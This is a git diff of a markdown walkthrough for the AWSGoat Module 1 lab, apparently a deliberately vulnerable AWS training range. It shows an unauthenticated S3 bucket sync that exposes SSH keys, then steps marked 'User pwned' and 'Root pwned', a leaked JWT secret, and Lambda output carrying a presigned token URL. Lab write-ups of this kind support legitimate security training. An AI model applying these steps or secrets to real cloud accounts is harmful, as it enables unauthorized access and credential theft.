@@ -1,4 +1,5 @@
 # Module 1
+### List S3 buckets
 ````
 ┌──(kali㉿kali)-[~]
 └─$ aws s3 ls                                                             
@@ -9,7 +10,7 @@
 2023-09-25 09:35:21 myvulnerablebucket
 2023-10-11 10:41:37 production-blog-awsgoat-bucket-315333988455
 ````
-
+### Download S3 Bucket
 ````
 ┌──(kali㉿kali)-[~]
 └─$ aws s3 sync s3://dev-blog-awsgoat-bucket-315333988455/ . --region us-east-1 --no-sign-request
@@ -41,7 +42,7 @@ download: s3://dev-blog-awsgoat-bucket-315333988455/shared/files/.ssh/keys/sophi
 download: s3://dev-blog-awsgoat-bucket-315333988455/static/js/787.8c65ad62.chunk.js.map to static/js/787.8c65ad62.chunk.js.map
 download: s3://dev-blog-awsgoat-bucket-315333988455/static/js/787.8c65ad62.chunk.js to static/js/787.8c65ad62.chunk.js
 ````
-User pwned
+### User pwned
 ````
 ┌──(kali㉿kali)-[~/Labs/AWSGoat/module1]
 └─$ cd shared      
@@ -80,7 +81,7 @@ info: Adding user `bob' to group `users' ...
 bob
 
 ````
-Root pwned
+### Root pwned
 ````
 ┌──(kali㉿kali)-[~/Labs/AWSGoat/module1]
 └─$ cd shared 
@@ -98,7 +99,7 @@ deploy_node.sh  php-deploy.sh  wordpress_deploy.sh
 └─# whoami
 root
 ````
-Keys of users
+### Keys of users
 ````
 ──(kali㉿kali)-[~/…/module1/shared/files/.ssh]
 └─$ ls
@@ -234,10 +235,56 @@ Host 10.0.48.71
     ]
 }
 ````
-Found JWT Secret:
+### Found JWT Secret:
 
             "Environment": {
                 "Variables": {
                     "JWT_SECRET": "T2BYL6#]zc>Byuzu"
                 }
             },
+            
+### Get Function blog-application
+````
+┌──(kali㉿kali)-[~/…/AWSGoat/module1/shared/scripts]
+└─$ aws lambda get-function --function-name blog-application --region us-east-1
+{
+    "Configuration": {
+        "FunctionName": "blog-application",
+        "FunctionArn": "arn:aws:lambda:us-east-1:315333988455:function:blog-application",
+        "Runtime": "nodejs14.x",
+        "Role": "arn:aws:iam::315333988455:role/blog_app_lambda",
+        "Handler": "index.handler",
+        "CodeSize": 416087,
+        "Description": "",
+        "Timeout": 3,
+        "MemorySize": 128,
+        "LastModified": "2023-10-11T09:42:24.184+0000",
+        "CodeSha256": "Rg+u4EXXP+oOnvXNgLjnm/ZH1fVbOfCjNa/k4Qy37XA=",
+        "Version": "$LATEST",
+        "TracingConfig": {
+            "Mode": "PassThrough"
+        },
+        "RevisionId": "8945f303-0759-4f25-9a84-b5ef7af95ba4",
+        "State": "Active",
+        "LastUpdateStatus": "Successful",
+        "PackageType": "Zip",
+        "Architectures": [
+            "x86_64"
+        ],
+        "EphemeralStorage": {
+            "Size": 512
+        },
+        "SnapStart": {
+            "ApplyOn": "None",
+            "OptimizationStatus": "Off"
+        },
+        "RuntimeVersionConfig": {
+            "RuntimeVersionArn": "arn:aws:lambda:us-east-1::runtime:6bb36f9b9d5441744b635fb38a7ec2ff2e3f880e8961af488cd3d98429398e3d"
+        }
+    },
+    "Code": {
+        "RepositoryType": "S3",
+        "Location": "https://prod-04-2014-tasks.s3.us-east-1.amazonaws.com/snapshots/315333988455/blog-application-183e9251-3bcb-490b-99c0-8f0e191f6830?versionId=FflJ6Ih.SY4nXYty2Pjr0Bowd3YZs34I&X-Amz-Security-Token=IQoJb3JpZ2luX2Vj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJIMEYCIQC4uELszJQehS4JnAOOd66scq6s5mFOx02OyXo3eGNczgIhAMuz%2BGLRsHxkOywdJuDi5RCux8Jj%2FJr%2Bg03kJNkFO4JxKroFCO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNzQ5Njc4OTAyODM5IgwjB4dY8WPGXrYyjfAqjE8xzXeQ908mlJ%2F3t9M8ByDQHTKgdV7b7EG2ZrniUg7MSRFxMYCuyqNYY1ZgCgrZA0Wt512FSWRHSuFed4wnxcX8rN0OHUh1k1iYqA2TMiEfFZEVWdvM1DWavru2Z6R1ko9ieMI6zrRKfgw2%2Brn5KNs8k12fXnljOoDKECLJCdJAL2K0c5k0Kur1E0MFYJU38QJBC2HS775AJFnaIGM9LMe0lSd3SHVXsVa6MgxjmHnMCJkM1XEk2TKeK2FIBb%2Fn29SNLfsmoMPSjMLeJfSRTedJqCthhyH8f7YMYb0S4LxZEecaZLgXhETWYbU38UcrFrxrmyMijasV%2BWk74Ol63foWxVpCoTqLJnyKiaaSwYKKKYHqa9gwM8aPOOBMJobvAX8ug9c7onlDhWuh186iLZyJHO0mwN9KgCx3d2E0jwgn1dfij9csFI6zSQ8OlWnrcfZotNxuUydilTyiinN4hvro56i7KcTEFajnrFc0v%2BrjpTH2zqIwfNQ0gBJ3PK2KG6FDsVNuNp5ReKMkYE0%2FlVZ5kqCFWUCucHJMOqJTSVEdPKFVevRU9uhqF7feWe9V2wTnnqUNkjvdHEewrNEJj8fmzlLqr4JoPwyrX6Rdpv%2FhZOL2PZL8jR8gd7Gpml1w9T48HPAsbEWfTPP3LciqprhpvHJ6P13XnkWp83AGqokmJgbGbs0MTXg576XdU5EzIByhk7HQb3qZxlINuidRLGHVUGc3PfjpbzeA%2BgRMQ90JPn4e7qGjoaODVjXqs451NbqHmX7IUMfjR5TxESKQbi%2BaLeh%2F%2FeLVcupnceAsfyvDHkH8%2BOT%2BojTdWCaPUUQtpIbuQdCBxsCbl2Mh2GMyKj%2F8LSbHy%2Fow3aGaqQY6sAHRRN%2BFqi3KRVspiBvdDQG%2nkR8F29qhouIBKqLyUw%2BFolFjSJ4xef3u5RYkozLWirDabLrNQGvC%2BEyaqTOyNeQnc9BNxAX2wOU%2Ftvu6QjIAW5KIBKhCvSehFw4g7I2VutpBtG2VrA6l2X%2FHd9k8lbmh%2BSHIF2XrCOZ%2BPWGlqvWhWXdqbhdNixfEEG4fJDmil1hNfAL0fzZhHUpsC8Ux8QRNabwhj5tHE4QSrl4hLuQ%3D%3D&Xz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20231011T135620Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIA25DCYHY3ZZGUDEOX%2F20231011%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=2aa0009a65311e0fdf59327339d62bcb48c0c915416c76481aa4464376883"
+    }
+}
+````
